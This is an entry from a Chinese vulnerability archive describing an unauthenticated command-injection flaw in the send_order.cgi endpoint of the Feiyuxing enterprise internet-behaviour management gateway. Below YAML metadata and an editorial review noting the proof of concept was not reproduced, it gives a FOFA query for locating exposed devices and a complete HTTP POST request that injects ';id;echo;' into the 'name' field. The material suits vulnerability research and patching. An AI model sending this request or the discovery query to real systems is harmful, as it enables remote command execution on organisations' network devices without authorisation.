---
source: "wy876 漏洞文库"
id: "vw-656e233c29365cb5df2d0e9f"
entity_id: "ve-656e233c29365cb5df2d0e9f"
schema_version: "1"
title: "飞鱼星智能上网行为管理系统send_order存在远程命令执行漏洞"
product: "飞鱼星企业级智能上网行为管理"
record_type: "advisory"
review_status: "text-reviewed"
verification_status: "not-reproduced"
content_status: "needs-review"
identifier_status: "unknown"
identifier_role: "unknown"
primary_identifiers: ""
referenced_identifiers: ""
prerequisites: "无cookie，opid/角色作用未述；版本未知"
archive_url: "https://github.com/Ares-X/VulWiki/blob/41940cb0038d09ca5aaddbe5bffb923e423d210f/Web%E5%AE%89%E5%85%A8/%E7%BD%91%E7%BB%9C%E8%AE%BE%E5%A4%87/%E9%A3%9E%E9%B1%BC%E6%98%9F/%E9%A3%9E%E9%B1%BC%E6%98%9F%E6%99%BA%E8%83%BD%E4%B8%8A%E7%BD%91%E8%A1%8C%E4%B8%BA%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9Fsend_order%E5%AD%98%E5%9C%A8%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E.md"
review_date: "2026-10-02"
side_effects: "执行文中载荷可能以目标进程权限启动命令或加载代码；权限受认证角色、操作系统账户及依赖版本约束，不能把 root/200 等通用字符串当成功证据"
source_url: "https://www.yuque.com/xiaokp7/ocvun2/ewvgyd0pqty4snsb"
source_status: "recorded"
previous_fofa_unverified: "<font style="
fofa: "title=\"飞鱼星企业级智能上网行为管理系统\""
---

# 飞鱼星智能上网行为管理系统send_order存在远程命令执行漏洞

> 指纹字段校订（2026-10-04）：按原归档正文的明确平台标签及完整表达式恢复当前查询，旧误填或截取字段逐字保存在 `previous_*`；后文对此旧字段的诊断按当前字段阅读。仅经过本库保守语法与原字面核对，未在线运行查询，不把指纹命中视为漏洞存在。

<!-- article-review:devices:begin -->
## 技术校订与证据边界（2026-10-02）

- 产品/组件：飞鱼星企业级智能上网行为管理
- 本文讨论：send_order.cgi operation name命令注入
- 版本、权限与配置前提：无cookie，opid/角色作用未述；版本未知
- 资料类型：命令注入请求摘要；本次仅核对归档正文，未执行 PoC、未请求目标，未把原作者的“复现成功”继承为本库验证结果

### 逐项校订

- JSON体与form Content-Type需说明；无响应，opid长常量是否必需未知
- fofa元数据被font污染，缺补丁
- 已落实的文本修订：HTTP 报文围栏改为 http；残缺指纹退出可执行索引并保留原值。上列仍描述旧文问题时，以此落实项及下列限定为准；修订不代表运行验证

### 操作风险与恢复

- 执行文中载荷可能以目标进程权限启动命令或加载代码；权限受认证角色、操作系统账户及依赖版本约束，不能把 root/200 等通用字符串当成功证据

### 待核与来源

- opid语义、鉴权与实际命令效果待确认
- 文内原始链接和图片引用继续保留；未检查图片像素、未下载或执行外部附件。版本边界、修复/在野状态及厂商归属若缺一手依据，均不能视为本次已确认
- 下方保留原技术正文与载荷；其中历史时间表述和成功主张应按本节限定阅读
<!-- article-review:devices:end -->


# 一、漏洞详情
飞鱼星智能上网行为管理系统send_order存在远程命令执行漏洞，攻击者可通过该漏洞获取服务器权限。

# 二、影响版本
+ 飞鱼星智能上网行为管理系统

# 三、资产测绘
+ fofa`<font style="color:rgb(51, 51, 51);">title="飞鱼星企业级智能上网行为管理系统"</font>`
+ <font style="color:rgb(51, 51, 51);">特征</font>


# 四、漏洞复现
```http
POST /send_order.cgi?parameter=operation HTTP/1.1
Host: 
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:123.0) Gecko/20100101 Firefox/123.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Connection: close
Upgrade-Insecure-Requests: 1
Content-Type: application/x-www-form-urlencoded
Content-Length: 62

{"opid":"777777777777777777","name":";id;echo;","type":"rest"}
```


> 原文: <https://www.yuque.com/xiaokp7/ocvun2/ewvgyd0pqty4snsb>


---

> 来源：wy876 漏洞文库（https://github.com/wy876/POC (备份镜像 DMW11525708/wiki)）
